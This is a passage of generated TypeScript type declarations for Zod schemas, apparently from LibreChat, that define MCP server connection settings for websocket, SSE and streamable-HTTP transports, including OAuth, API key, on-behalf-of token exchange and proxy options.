        grant_types_supported?: string[] | undefined;
        token_endpoint_auth_methods_supported?: string[] | undefined;
        response_types_supported?: string[] | undefined;
        code_challenge_methods_supported?: string[] | undefined;
        skip_code_challenge_check?: boolean | undefined;
        audience?: string | undefined;
        forward_audience_on_refresh?: boolean | undefined;
        revocation_endpoint?: string | undefined;
        revocation_endpoint_auth_methods_supported?: string[] | undefined;
    }, {
        authorization_url?: string | undefined;
        token_url?: string | undefined;
        client_id?: string | undefined;
        client_secret?: string | undefined;
        scope?: string | undefined;
        redirect_uri?: string | undefined;
        token_exchange_method?: TokenExchangeMethodEnum | undefined;
        grant_types_supported?: string[] | undefined;
        token_endpoint_auth_methods_supported?: string[] | undefined;
        response_types_supported?: string[] | undefined;
        code_challenge_methods_supported?: string[] | undefined;
        skip_code_challenge_check?: boolean | undefined;
        audience?: string | undefined;
        forward_audience_on_refresh?: boolean | undefined;
        revocation_endpoint?: string | undefined;
        revocation_endpoint_auth_methods_supported?: string[] | undefined;
    }>, {
        authorization_url?: string | undefined;
        token_url?: string | undefined;
        client_id?: string | undefined;
        client_secret?: string | undefined;
        scope?: string | undefined;
        redirect_uri?: string | undefined;
        token_exchange_method?: TokenExchangeMethodEnum | undefined;
        grant_types_supported?: string[] | undefined;
        token_endpoint_auth_methods_supported?: string[] | undefined;
        response_types_supported?: string[] | undefined;
        code_challenge_methods_supported?: string[] | undefined;
        skip_code_challenge_check?: boolean | undefined;
        audience?: string | undefined;
        forward_audience_on_refresh?: boolean | undefined;
        revocation_endpoint?: string | undefined;
        revocation_endpoint_auth_methods_supported?: string[] | undefined;
    }, {
        authorization_url?: string | undefined;
        token_url?: string | undefined;
        client_id?: string | undefined;
        client_secret?: string | undefined;
        scope?: string | undefined;
        redirect_uri?: string | undefined;
        token_exchange_method?: TokenExchangeMethodEnum | undefined;
        grant_types_supported?: string[] | undefined;
        token_endpoint_auth_methods_supported?: string[] | undefined;
        response_types_supported?: string[] | undefined;
        code_challenge_methods_supported?: string[] | undefined;
        skip_code_challenge_check?: boolean | undefined;
        audience?: string | undefined;
        forward_audience_on_refresh?: boolean | undefined;
        revocation_endpoint?: string | undefined;
        revocation_endpoint_auth_methods_supported?: string[] | undefined;
    }>>;
    /** Custom headers to send with OAuth requests (registration, discovery, token exchange, etc.) */
    oauth_headers: z.ZodOptional<z.ZodRecord<z.ZodString, z.ZodString>>;
    /**
     * API Key authentication configuration for SSE and Streamable HTTP transports
     * - source: 'admin' means the key is provided by admin and shared by all users
     * - source: 'user' means each user provides their own key via customUserVars
     */
    apiKey: z.ZodOptional<z.ZodObject<{
        /** API key value (only for admin-provided mode, stored encrypted) */
        key: z.ZodOptional<z.ZodString>;
        /** Whether key is provided by admin or each user */
        source: z.ZodEnum<["admin", "user"]>;
        /** How to format the authorization header */
        authorization_type: z.ZodEnum<["basic", "bearer", "custom"]>;
        /** Custom header name when authorization_type is 'custom' */
        custom_header: z.ZodOptional<z.ZodString>;
    }, "strip", z.ZodTypeAny, {
        source: "user" | "admin";
        authorization_type: "custom" | "basic" | "bearer";
        key?: string | undefined;
        custom_header?: string | undefined;
    }, {
        source: "user" | "admin";
        authorization_type: "custom" | "basic" | "bearer";
        key?: string | undefined;
        custom_header?: string | undefined;
    }>>;
    customUserVars: z.ZodOptional<z.ZodRecord<z.ZodString, z.ZodObject<{
        title: z.ZodString;
        description: z.ZodString;
        /**
         * Whether the field holds a secret and should be masked in the UI.
         * Defaults to masked when omitted; set to `false` for non-secret setup
         * values (e.g. username, project key, base URL) to render as plain text.
         */
        sensitive: z.ZodOptional<z.ZodBoolean>;
    }, "strip", z.ZodTypeAny, {
        description: string;
        title: string;
        sensitive?: boolean | undefined;
    }, {
        description: string;
        title: string;
        sensitive?: boolean | undefined;
    }>>>;
} & {
    type: z.ZodDefault<z.ZodLiteral<"websocket">>;
    obo: z.ZodOptional<z.ZodUndefined>;
    url: z.ZodEffects<z.ZodPipeline<z.ZodEffects<z.ZodString, string, string>, z.ZodString>, string, string>;
}, "strip", z.ZodTypeAny, {
    type: "websocket";
    url: string;
    description?: string | undefined;
    title?: string | undefined;
    chatMenu?: boolean | undefined;
    startup?: boolean | undefined;
    iconPath?: string | undefined;
    timeout?: number | undefined;
    sseReadTimeout?: number | undefined;
    initTimeout?: number | undefined;
    serverInstructions?: string | boolean | undefined;
    requiresOAuth?: boolean | undefined;
    oauth?: {
        authorization_url?: string | undefined;
        token_url?: string | undefined;
        client_id?: string | undefined;
        client_secret?: string | undefined;
        scope?: string | undefined;
        redirect_uri?: string | undefined;
        token_exchange_method?: TokenExchangeMethodEnum | undefined;
        grant_types_supported?: string[] | undefined;
        token_endpoint_auth_methods_supported?: string[] | undefined;
        response_types_supported?: string[] | undefined;
        code_challenge_methods_supported?: string[] | undefined;
        skip_code_challenge_check?: boolean | undefined;
        audience?: string | undefined;
        forward_audience_on_refresh?: boolean | undefined;
        revocation_endpoint?: string | undefined;
        revocation_endpoint_auth_methods_supported?: string[] | undefined;
    } | undefined;
    oauth_headers?: Record<string, string> | undefined;
    apiKey?: {
        source: "user" | "admin";
        authorization_type: "custom" | "basic" | "bearer";
        key?: string | undefined;
        custom_header?: string | undefined;
    } | undefined;
    customUserVars?: Record<string, {
        description: string;
        title: string;
        sensitive?: boolean | undefined;
    }> | undefined;
    obo?: undefined;
}, {
    url: string;
    type?: "websocket" | undefined;
    description?: string | undefined;
    title?: string | undefined;
    chatMenu?: boolean | undefined;
    startup?: boolean | undefined;
    iconPath?: string | undefined;
    timeout?: number | undefined;
    sseReadTimeout?: number | undefined;
    initTimeout?: number | undefined;
    serverInstructions?: string | boolean | undefined;
    requiresOAuth?: boolean | undefined;
    oauth?: {
        authorization_url?: string | undefined;
        token_url?: string | undefined;
        client_id?: string | undefined;
        client_secret?: string | undefined;
        scope?: string | undefined;
        redirect_uri?: string | undefined;
        token_exchange_method?: TokenExchangeMethodEnum | undefined;
        grant_types_supported?: string[] | undefined;
        token_endpoint_auth_methods_supported?: string[] | undefined;
        response_types_supported?: string[] | undefined;
        code_challenge_methods_supported?: string[] | undefined;
        skip_code_challenge_check?: boolean | undefined;
        audience?: string | undefined;
        forward_audience_on_refresh?: boolean | undefined;
        revocation_endpoint?: string | undefined;
        revocation_endpoint_auth_methods_supported?: string[] | undefined;
    } | undefined;
    oauth_headers?: Record<string, string> | undefined;
    apiKey?: {
        source: "user" | "admin";
        authorization_type: "custom" | "basic" | "bearer";
        key?: string | undefined;
        custom_header?: string | undefined;
    } | undefined;
    customUserVars?: Record<string, {
        description: string;
        title: string;
        sensitive?: boolean | undefined;
    }> | undefined;
    obo?: undefined;
}>, z.ZodObject<{
    /** Display name for the MCP server - only letters, numbers, and spaces allowed */
    title: z.ZodOptional<z.ZodString>;
    /** Description of the MCP server */
    description: z.ZodOptional<z.ZodString>;
    /**
     * Controls whether the MCP server is initialized during application startup.
     * - true (default): Server is initialized during app startup and included in app-level connections
     * - false: Skips initialization at startup and excludes from app-level connections - useful for servers
     *   requiring manual authentication (e.g., GitHub PAT tokens) that need to be configured through the UI after startup
     */
    startup: z.ZodOptional<z.ZodBoolean>;
    iconPath: z.ZodOptional<z.ZodString>;
    timeout: z.ZodOptional<z.ZodNumber>;
    /** Timeout (ms) for the long-lived SSE GET stream body before undici aborts it. Default: 300_000 (5 min). */
    sseReadTimeout: z.ZodOptional<z.ZodNumber>;
    initTimeout: z.ZodOptional<z.ZodNumber>;
    /** Controls visibility in chat dropdown menu (MCPSelect) */
    chatMenu: z.ZodOptional<z.ZodBoolean>;
    /**
     * Controls server instruction behavior:
     * - undefined/not set: No instructions included (default)
     * - true: Use server-provided instructions
     * - string: Use custom instructions (overrides server-provided)
     */
    serverInstructions: z.ZodOptional<z.ZodUnion<[z.ZodBoolean, z.ZodString]>>;
    /**
     * Whether this server requires OAuth authentication
     * If not specified, will be auto-detected during construction
     */
    requiresOAuth: z.ZodOptional<z.ZodBoolean>;
    /**
     * OAuth configuration for SSE and Streamable HTTP transports
     * - Optional: OAuth can be auto-discovered on 401 responses
     * - Pre-configured confidential clients must pin both OAuth endpoints
     */
    oauth: z.ZodOptional<z.ZodEffects<z.ZodObject<{
        /** OAuth authorization endpoint (optional - can be auto-discovered) */
        authorization_url: z.ZodOptional<z.ZodPipeline<z.ZodEffects<z.ZodString, string, string>, z.ZodString>>;
        /** OAuth token endpoint (optional - can be auto-discovered) */
        token_url: z.ZodOptional<z.ZodPipeline<z.ZodEffects<z.ZodString, string, string>, z.ZodString>>;
        /** OAuth client ID (optional - can use dynamic registration) */
        client_id: z.ZodOptional<z.ZodString>;
        /** OAuth client secret (requires explicit authorization and token endpoints) */
        client_secret: z.ZodOptional<z.ZodString>;
        /** OAuth scopes to request */
        scope: z.ZodOptional<z.ZodString>;
        /** OAuth redirect URI (defaults to /api/mcp/{serverName}/oauth/callback) */
        redirect_uri: z.ZodOptional<z.ZodPipeline<z.ZodEffects<z.ZodString, string, string>, z.ZodString>>;
        /** Token exchange method */
        token_exchange_method: z.ZodOptional<z.ZodNativeEnum<typeof TokenExchangeMethodEnum>>;
        /** Supported grant types (defaults to ['authorization_code', 'refresh_token']) */
        grant_types_supported: z.ZodOptional<z.ZodArray<z.ZodString, "many">>;
        /** Supported token endpoint authentication methods (defaults to ['client_secret_basic', 'client_secret_post']) */
        token_endpoint_auth_methods_supported: z.ZodOptional<z.ZodArray<z.ZodString, "many">>;
        /** Supported response types (defaults to ['code']) */
        response_types_supported: z.ZodOptional<z.ZodArray<z.ZodString, "many">>;
        /** Supported code challenge methods (defaults to ['S256', 'plain']) */
        code_challenge_methods_supported: z.ZodOptional<z.ZodArray<z.ZodString, "many">>;
        /** Skip code challenge validation and force S256 (useful for providers like AWS Cognito that support S256 but don't advertise it) */
        skip_code_challenge_check: z.ZodOptional<z.ZodBoolean>;
        /**
         * Auth0/Cognito-style `audience` parameter. Authorization servers that pre-date
         * RFC 8707 — most prominently Auth0 — issue API-scoped access tokens only when
         * the `/authorize` request advertises an `audience`. RFC 8707 `resource` (set
         * automatically from Protected Resource Metadata) is the standards-conformant
         * route; `audience` covers the providers that ignore it.
         *
         * When set, the value is forwarded as-is on `/authorize` (both pre-configured
         * and DCR-discovered paths). Whether it is also forwarded on the
         * `refresh_token` grant is controlled by `forward_audience_on_refresh` below.
         *
         * The `authorization_code` exchange intentionally never receives `audience` —
         * Auth0 binds audience from the original `/authorize` request and embeds it
         * in the issued access token; sending it again is redundant.
         *
         * No canonicalization is applied — the audience identifier is provider-defined
         * and may differ from the MCP server URL. This field is only accepted from
         * trusted/admin MCP configuration and is rejected from user-managed servers.
         */
        audience: z.ZodOptional<z.ZodString>;
        /**
         * Whether to also forward `audience` on the `refresh_token` grant body.
         *
         * Default: `true`. Required for Auth0, which strips the API audience from
         * refreshed access tokens unless `audience` is re-supplied on every refresh
         * — without it the next MCP call 401s once the initial access token expires.
         *
         * Set to `false` for providers that document refresh requests as
         * `grant_type` + `client_id` + `refresh_token` only (Cognito and other
         * strict OAuth 2.0 token endpoints). Those providers maintain the original
         * `aud` claim across refreshes when the initial token was resource-bound,
         * so the extra parameter is redundant and may be rejected as
         * `invalid_request`.
         *
         * Ignored when `audience` itself is not configured.
         */
        forward_audience_on_refresh: z.ZodOptional<z.ZodBoolean>;
        /** OAuth revocation endpoint (optional - can be auto-discovered) */
        revocation_endpoint: z.ZodOptional<z.ZodPipeline<z.ZodEffects<z.ZodString, string, string>, z.ZodString>>;
        /** OAuth revocation endpoint authentication methods supported (optional - can be auto-discovered) */
        revocation_endpoint_auth_methods_supported: z.ZodOptional<z.ZodArray<z.ZodString, "many">>;
    }, "strip", z.ZodTypeAny, {
        authorization_url?: string | undefined;
        token_url?: string | undefined;
        client_id?: string | undefined;
        client_secret?: string | undefined;
        scope?: string | undefined;
        redirect_uri?: string | undefined;
        token_exchange_method?: TokenExchangeMethodEnum | undefined;
        grant_types_supported?: string[] | undefined;
        token_endpoint_auth_methods_supported?: string[] | undefined;
        response_types_supported?: string[] | undefined;
        code_challenge_methods_supported?: string[] | undefined;
        skip_code_challenge_check?: boolean | undefined;
        audience?: string | undefined;
        forward_audience_on_refresh?: boolean | undefined;
        revocation_endpoint?: string | undefined;
        revocation_endpoint_auth_methods_supported?: string[] | undefined;
    }, {
        authorization_url?: string | undefined;
        token_url?: string | undefined;
        client_id?: string | undefined;
        client_secret?: string | undefined;
        scope?: string | undefined;
        redirect_uri?: string | undefined;
        token_exchange_method?: TokenExchangeMethodEnum | undefined;
        grant_types_supported?: string[] | undefined;
        token_endpoint_auth_methods_supported?: string[] | undefined;
        response_types_supported?: string[] | undefined;
        code_challenge_methods_supported?: string[] | undefined;
        skip_code_challenge_check?: boolean | undefined;
        audience?: string | undefined;
        forward_audience_on_refresh?: boolean | undefined;
        revocation_endpoint?: string | undefined;
        revocation_endpoint_auth_methods_supported?: string[] | undefined;
    }>, {
        authorization_url?: string | undefined;
        token_url?: string | undefined;
        client_id?: string | undefined;
        client_secret?: string | undefined;
        scope?: string | undefined;
        redirect_uri?: string | undefined;
        token_exchange_method?: TokenExchangeMethodEnum | undefined;
        grant_types_supported?: string[] | undefined;
        token_endpoint_auth_methods_supported?: string[] | undefined;
        response_types_supported?: string[] | undefined;
        code_challenge_methods_supported?: string[] | undefined;
        skip_code_challenge_check?: boolean | undefined;
        audience?: string | undefined;
        forward_audience_on_refresh?: boolean | undefined;
        revocation_endpoint?: string | undefined;
        revocation_endpoint_auth_methods_supported?: string[] | undefined;
    }, {
        authorization_url?: string | undefined;
        token_url?: string | undefined;
        client_id?: string | undefined;
        client_secret?: string | undefined;
        scope?: string | undefined;
        redirect_uri?: string | undefined;
        token_exchange_method?: TokenExchangeMethodEnum | undefined;
        grant_types_supported?: string[] | undefined;
        token_endpoint_auth_methods_supported?: string[] | undefined;
        response_types_supported?: string[] | undefined;
        code_challenge_methods_supported?: string[] | undefined;
        skip_code_challenge_check?: boolean | undefined;
        audience?: string | undefined;
        forward_audience_on_refresh?: boolean | undefined;
        revocation_endpoint?: string | undefined;
        revocation_endpoint_auth_methods_supported?: string[] | undefined;
    }>>;
    /** Custom headers to send with OAuth requests (registration, discovery, token exchange, etc.) */
    oauth_headers: z.ZodOptional<z.ZodRecord<z.ZodString, z.ZodString>>;
    /**
     * API Key authentication configuration for SSE and Streamable HTTP transports
     * - source: 'admin' means the key is provided by admin and shared by all users
     * - source: 'user' means each user provides their own key via customUserVars
     */
    apiKey: z.ZodOptional<z.ZodObject<{
        /** API key value (only for admin-provided mode, stored encrypted) */
        key: z.ZodOptional<z.ZodString>;
        /** Whether key is provided by admin or each user */
        source: z.ZodEnum<["admin", "user"]>;
        /** How to format the authorization header */
        authorization_type: z.ZodEnum<["basic", "bearer", "custom"]>;
        /** Custom header name when authorization_type is 'custom' */
        custom_header: z.ZodOptional<z.ZodString>;
    }, "strip", z.ZodTypeAny, {
        source: "user" | "admin";
        authorization_type: "custom" | "basic" | "bearer";
        key?: string | undefined;
        custom_header?: string | undefined;
    }, {
        source: "user" | "admin";
        authorization_type: "custom" | "basic" | "bearer";
        key?: string | undefined;
        custom_header?: string | undefined;
    }>>;
    customUserVars: z.ZodOptional<z.ZodRecord<z.ZodString, z.ZodObject<{
        title: z.ZodString;
        description: z.ZodString;
        /**
         * Whether the field holds a secret and should be masked in the UI.
         * Defaults to masked when omitted; set to `false` for non-secret setup
         * values (e.g. username, project key, base URL) to render as plain text.
         */
        sensitive: z.ZodOptional<z.ZodBoolean>;
    }, "strip", z.ZodTypeAny, {
        description: string;
        title: string;
        sensitive?: boolean | undefined;
    }, {
        description: string;
        title: string;
        sensitive?: boolean | undefined;
    }>>>;
} & {
    type: z.ZodDefault<z.ZodLiteral<"sse">>;
    headers: z.ZodOptional<z.ZodRecord<z.ZodString, z.ZodString>>;
    /**
     * On-Behalf-Of (OBO) token exchange configuration.
     * When configured, LibreChat exchanges the logged-in user's federated access token
     * for a token scoped to this MCP server via the OAuth 2.0 OBO flow (jwt-bearer grant).
     * The exchanged token is injected as a Bearer Authorization header automatically.
     * Requires the user to be authenticated via OpenID Connect (e.g., Entra ID).
     */
    obo: z.ZodOptional<z.ZodObject<{
        /** Scopes to request for the downstream MCP server (e.g., "api://<client-id>/Mcp.Tools.ReadWrite") */
        scopes: z.ZodString;
    }, "strip", z.ZodTypeAny, {
        scopes: string;
    }, {
        scopes: string;
    }>>;
    /** Optional outbound proxy URL for this remote MCP transport */
    proxy: z.ZodOptional<z.ZodEffects<z.ZodPipeline<z.ZodEffects<z.ZodString, string, string>, z.ZodString>, string, string>>;
    url: z.ZodEffects<z.ZodPipeline<z.ZodEffects<z.ZodString, string, string>, z.ZodString>, string, string>;
}, "strip", z.ZodTypeAny, {
    type: "sse";
    url: string;
    description?: string | undefined;
    title?: string | undefined;
    chatMenu?: boolean | undefined;
    startup?: boolean | undefined;
    iconPath?: string | undefined;
    timeout?: number | undefined;
    sseReadTimeout?: number | undefined;
    initTimeout?: number | undefined;
    serverInstructions?: string | boolean | undefined;
    requiresOAuth?: boolean | undefined;
    oauth?: {
        authorization_url?: string | undefined;
        token_url?: string | undefined;
        client_id?: string | undefined;
        client_secret?: string | undefined;
        scope?: string | undefined;
        redirect_uri?: string | undefined;
        token_exchange_method?: TokenExchangeMethodEnum | undefined;
        grant_types_supported?: string[] | undefined;
        token_endpoint_auth_methods_supported?: string[] | undefined;
        response_types_supported?: string[] | undefined;
        code_challenge_methods_supported?: string[] | undefined;
        skip_code_challenge_check?: boolean | undefined;
        audience?: string | undefined;
        forward_audience_on_refresh?: boolean | undefined;
        revocation_endpoint?: string | undefined;
        revocation_endpoint_auth_methods_supported?: string[] | undefined;
    } | undefined;
    oauth_headers?: Record<string, string> | undefined;
    apiKey?: {
        source: "user" | "admin";
        authorization_type: "custom" | "basic" | "bearer";
        key?: string | undefined;
        custom_header?: string | undefined;
    } | undefined;
    customUserVars?: Record<string, {
        description: string;
        title: string;
        sensitive?: boolean | undefined;
    }> | undefined;
    obo?: {
        scopes: string;
    } | undefined;
    headers?: Record<string, string> | undefined;
    proxy?: string | undefined;
}, {
    url: string;
    type?: "sse" | undefined;
    description?: string | undefined;
    title?: string | undefined;
    chatMenu?: boolean | undefined;
    startup?: boolean | undefined;
    iconPath?: string | undefined;
    timeout?: number | undefined;
    sseReadTimeout?: number | undefined;
    initTimeout?: number | undefined;
    serverInstructions?: string | boolean | undefined;
    requiresOAuth?: boolean | undefined;
    oauth?: {
        authorization_url?: string | undefined;
        token_url?: string | undefined;
        client_id?: string | undefined;
        client_secret?: string | undefined;
        scope?: string | undefined;
        redirect_uri?: string | undefined;
        token_exchange_method?: TokenExchangeMethodEnum | undefined;
        grant_types_supported?: string[] | undefined;
        token_endpoint_auth_methods_supported?: string[] | undefined;
        response_types_supported?: string[] | undefined;
        code_challenge_methods_supported?: string[] | undefined;
        skip_code_challenge_check?: boolean | undefined;
        audience?: string | undefined;
        forward_audience_on_refresh?: boolean | undefined;
        revocation_endpoint?: string | undefined;
        revocation_endpoint_auth_methods_supported?: string[] | undefined;
    } | undefined;
    oauth_headers?: Record<string, string> | undefined;
    apiKey?: {
        source: "user" | "admin";
        authorization_type: "custom" | "basic" | "bearer";
        key?: string | undefined;
        custom_header?: string | undefined;
    } | undefined;
    customUserVars?: Record<string, {
        description: string;
        title: string;
        sensitive?: boolean | undefined;
    }> | undefined;
    obo?: {
        scopes: string;
    } | undefined;
    headers?: Record<string, string> | undefined;
    proxy?: string | undefined;
}>, z.ZodObject<{
    /** Display name for the MCP server - only letters, numbers, and spaces allowed */
    title: z.ZodOptional<z.ZodString>;
    /** Description of the MCP server */
    description: z.ZodOptional<z.ZodString>;
    /**
     * Controls whether the MCP server is initialized during application startup.
     * - true (default): Server is initialized during app startup and included in app-level connections
     * - false: Skips initialization at startup and excludes from app-level connections - useful for servers
     *   requiring manual authentication (e.g., GitHub PAT tokens) that need to be configured through the UI after startup
     */
    startup: z.ZodOptional<z.ZodBoolean>;
    iconPath: z.ZodOptional<z.ZodString>;
    timeout: z.ZodOptional<z.ZodNumber>;
    /** Timeout (ms) for the long-lived SSE GET stream body before undici aborts it. Default: 300_000 (5 min). */
    sseReadTimeout: z.ZodOptional<z.ZodNumber>;
    initTimeout: z.ZodOptional<z.ZodNumber>;
    /** Controls visibility in chat dropdown menu (MCPSelect) */
    chatMenu: z.ZodOptional<z.ZodBoolean>;
    /**
     * Controls server instruction behavior:
     * - undefined/not set: No instructions included (default)
     * - true: Use server-provided instructions
     * - string: Use custom instructions (overrides server-provided)
     */
    serverInstructions: z.ZodOptional<z.ZodUnion<[z.ZodBoolean, z.ZodString]>>;
    /**
     * Whether this server requires OAuth authentication
     * If not specified, will be auto-detected during construction
     */
    requiresOAuth: z.ZodOptional<z.ZodBoolean>;
    /**
     * OAuth configuration for SSE and Streamable HTTP transports
     * - Optional: OAuth can be auto-discovered on 401 responses
     * - Pre-configured confidential clients must pin both OAuth endpoints
     */
    oauth: z.ZodOptional<z.ZodEffects<z.ZodObject<{
        /** OAuth authorization endpoint (optional - can be auto-discovered) */
        authorization_url: z.ZodOptional<z.ZodPipeline<z.ZodEffects<z.ZodString, string, string>, z.ZodString>>;
        /** OAuth token endpoint (optional - can be auto-discovered) */
        token_url: z.ZodOptional<z.ZodPipeline<z.ZodEffects<z.ZodString, string, string>, z.ZodString>>;
        /** OAuth client ID (optional - can use dynamic registration) */
        client_id: z.ZodOptional<z.ZodString>;
        /** OAuth client secret (requires explicit authorization and token endpoints) */
        client_secret: z.ZodOptional<z.ZodString>;
        /** OAuth scopes to request */
        scope: z.ZodOptional<z.ZodString>;
        /** OAuth redirect URI (defaults to /api/mcp/{serverName}/oauth/callback) */
        redirect_uri: z.ZodOptional<z.ZodPipeline<z.ZodEffects<z.ZodString, string, string>, z.ZodString>>;
        /** Token exchange method */
        token_exchange_method: z.ZodOptional<z.ZodNativeEnum<typeof TokenExchangeMethodEnum>>;
        /** Supported grant types (defaults to ['authorization_code', 'refresh_token']) */
        grant_types_supported: z.ZodOptional<z.ZodArray<z.ZodString, "many">>;
        /** Supported token endpoint authentication methods (defaults to ['client_secret_basic', 'client_secret_post']) */
        token_endpoint_auth_methods_supported: z.ZodOptional<z.ZodArray<z.ZodString, "many">>;
        /** Supported response types (defaults to ['code']) */
        response_types_supported: z.ZodOptional<z.ZodArray<z.ZodString, "many">>;
        /** Supported code challenge methods (defaults to ['S256', 'plain']) */
        code_challenge_methods_supported: z.ZodOptional<z.ZodArray<z.ZodString, "many">>;
        /** Skip code challenge validation and force S256 (useful for providers like AWS Cognito that support S256 but don't advertise it) */
        skip_code_challenge_check: z.ZodOptional<z.ZodBoolean>;
        /**
         * Auth0/Cognito-style `audience` parameter. Authorization servers that pre-date
         * RFC 8707 — most prominently Auth0 — issue API-scoped access tokens only when
         * the `/authorize` request advertises an `audience`. RFC 8707 `resource` (set
         * automatically from Protected Resource Metadata) is the standards-conformant
         * route; `audience` covers the providers that ignore it.
         *
         * When set, the value is forwarded as-is on `/authorize` (both pre-configured
         * and DCR-discovered paths). Whether it is also forwarded on the
         * `refresh_token` grant is controlled by `forward_audience_on_refresh` below.
         *
         * The `authorization_code` exchange intentionally never receives `audience` —
         * Auth0 binds audience from the original `/authorize` request and embeds it
         * in the issued access token; sending it again is redundant.
         *
         * No canonicalization is applied — the audience identifier is provider-defined
         * and may differ from the MCP server URL. This field is only accepted from
         * trusted/admin MCP configuration and is rejected from user-managed servers.
         */
        audience: z.ZodOptional<z.ZodString>;
        /**
         * Whether to also forward `audience` on the `refresh_token` grant body.
         *
         * Default: `true`. Required for Auth0, which strips the API audience from
         * refreshed access tokens unless `audience` is re-supplied on every refresh
         * — without it the next MCP call 401s once the initial access token expires.
         *
         * Set to `false` for providers that document refresh requests as
         * `grant_type` + `client_id` + `refresh_token` only (Cognito and other
         * strict OAuth 2.0 token endpoints). Those providers maintain the original
         * `aud` claim across refreshes when the initial token was resource-bound,
         * so the extra parameter is redundant and may be rejected as
         * `invalid_request`.
         *
         * Ignored when `audience` itself is not configured.
         */
        forward_audience_on_refresh: z.ZodOptional<z.ZodBoolean>;
        /** OAuth revocation endpoint (optional - can be auto-discovered) */
        revocation_endpoint: z.ZodOptional<z.ZodPipeline<z.ZodEffects<z.ZodString, string, string>, z.ZodString>>;
        /** OAuth revocation endpoint authentication methods supported (optional - can be auto-discovered) */
        revocation_endpoint_auth_methods_supported: z.ZodOptional<z.ZodArray<z.ZodString, "many">>;
    }, "strip", z.ZodTypeAny, {
        authorization_url?: string | undefined;
        token_url?: string | undefined;
        client_id?: string | undefined;
        client_secret?: string | undefined;
        scope?: string | undefined;
        redirect_uri?: string | undefined;
        token_exchange_method?: TokenExchangeMethodEnum | undefined;
        grant_types_supported?: string[] | undefined;
        token_endpoint_auth_methods_supported?: string[] | undefined;
        response_types_supported?: string[] | undefined;
        code_challenge_methods_supported?: string[] | undefined;
        skip_code_challenge_check?: boolean | undefined;
        audience?: string | undefined;
        forward_audience_on_refresh?: boolean | undefined;
        revocation_endpoint?: string | undefined;
        revocation_endpoint_auth_methods_supported?: string[] | undefined;
    }, {
        authorization_url?: string | undefined;
        token_url?: string | undefined;
        client_id?: string | undefined;
        client_secret?: string | undefined;
        scope?: string | undefined;
        redirect_uri?: string | undefined;
        token_exchange_method?: TokenExchangeMethodEnum | undefined;
        grant_types_supported?: string[] | undefined;
        token_endpoint_auth_methods_supported?: string[] | undefined;
        response_types_supported?: string[] | undefined;
        code_challenge_methods_supported?: string[] | undefined;
        skip_code_challenge_check?: boolean | undefined;
        audience?: string | undefined;
        forward_audience_on_refresh?: boolean | undefined;
        revocation_endpoint?: string | undefined;
        revocation_endpoint_auth_methods_supported?: string[] | undefined;
    }>, {
        authorization_url?: string | undefined;
        token_url?: string | undefined;
        client_id?: string | undefined;
        client_secret?: string | undefined;
        scope?: string | undefined;
        redirect_uri?: string | undefined;
        token_exchange_method?: TokenExchangeMethodEnum | undefined;
        grant_types_supported?: string[] | undefined;
        token_endpoint_auth_methods_supported?: string[] | undefined;
        response_types_supported?: string[] | undefined;
        code_challenge_methods_supported?: string[] | undefined;
        skip_code_challenge_check?: boolean | undefined;
        audience?: string | undefined;
        forward_audience_on_refresh?: boolean | undefined;
        revocation_endpoint?: string | undefined;
        revocation_endpoint_auth_methods_supported?: string[] | undefined;
    }, {
        authorization_url?: string | undefined;
        token_url?: string | undefined;
        client_id?: string | undefined;
        client_secret?: string | undefined;
        scope?: string | undefined;
        redirect_uri?: string | undefined;
        token_exchange_method?: TokenExchangeMethodEnum | undefined;
        grant_types_supported?: string[] | undefined;
        token_endpoint_auth_methods_supported?: string[] | undefined;
        response_types_supported?: string[] | undefined;
        code_challenge_methods_supported?: string[] | undefined;
        skip_code_challenge_check?: boolean | undefined;
        audience?: string | undefined;
        forward_audience_on_refresh?: boolean | undefined;
        revocation_endpoint?: string | undefined;
        revocation_endpoint_auth_methods_supported?: string[] | undefined;
    }>>;
    /** Custom headers to send with OAuth requests (registration, discovery, token exchange, etc.) */
    oauth_headers: z.ZodOptional<z.ZodRecord<z.ZodString, z.ZodString>>;
    /**
     * API Key authentication configuration for SSE and Streamable HTTP transports
     * - source: 'admin' means the key is provided by admin and shared by all users
     * - source: 'user' means each user provides their own key via customUserVars
     */
    apiKey: z.ZodOptional<z.ZodObject<{
        /** API key value (only for admin-provided mode, stored encrypted) */
        key: z.ZodOptional<z.ZodString>;
        /** Whether key is provided by admin or each user */
        source: z.ZodEnum<["admin", "user"]>;
        /** How to format the authorization header */
        authorization_type: z.ZodEnum<["basic", "bearer", "custom"]>;
        /** Custom header name when authorization_type is 'custom' */
        custom_header: z.ZodOptional<z.ZodString>;
    }, "strip", z.ZodTypeAny, {
        source: "user" | "admin";
        authorization_type: "custom" | "basic" | "bearer";
        key?: string | undefined;
        custom_header?: string | undefined;
    }, {
        source: "user" | "admin";
        authorization_type: "custom" | "basic" | "bearer";
        key?: string | undefined;
        custom_header?: string | undefined;
    }>>;
    customUserVars: z.ZodOptional<z.ZodRecord<z.ZodString, z.ZodObject<{
        title: z.ZodString;
        description: z.ZodString;
        /**
         * Whether the field holds a secret and should be masked in the UI.
         * Defaults to masked when omitted; set to `false` for non-secret setup
         * values (e.g. username, project key, base URL) to render as plain text.
         */
        sensitive: z.ZodOptional<z.ZodBoolean>;
    }, "strip", z.ZodTypeAny, {
        description: string;
        title: string;
        sensitive?: boolean | undefined;
    }, {
        description: string;
        title: string;
        sensitive?: boolean | undefined;
    }>>>;
} & {
    type: z.ZodUnion<[z.ZodLiteral<"streamable-http">, z.ZodLiteral<"http">]>;
    headers: z.ZodOptional<z.ZodRecord<z.ZodString, z.ZodString>>;
    /**
     * On-Behalf-Of (OBO) token exchange configuration.
     * When configured, LibreChat exchanges the logged-in user's federated access token
     * for a token scoped to this MCP server via the OAuth 2.0 OBO flow (jwt-bearer grant).
     * The exchanged token is injected as a Bearer Authorization header automatically.
     * Requires the user to be authenticated via OpenID Connect (e.g., Entra ID).
     */
    obo: z.ZodOptional<z.ZodObject<{
        /** Scopes to request for the downstream MCP server (e.g., "api://<client-id>/Mcp.Tools.ReadWrite") */
        scopes: z.ZodString;
    }, "strip", z.ZodTypeAny, {
        scopes: string;
    }, {
        scopes: string;
    }>>;
    /** Optional outbound proxy URL for this remote MCP transport */
    proxy: z.ZodOptional<z.ZodEffects<z.ZodPipeline<z.ZodEffects<z.ZodString, string, string>, z.ZodString>, string, string>>;
    url: z.ZodEffects<z.ZodPipeline<z.ZodEffects<z.ZodString, string, string>, z.ZodString>, string, string>;
}, "strip", z.ZodTypeAny, {
    type: "streamable-http" | "http";
    url: string;
    description?: string | undefined;
    title?: string | undefined;
    chatMenu?: boolean | undefined;
    startup?: boolean | undefined;
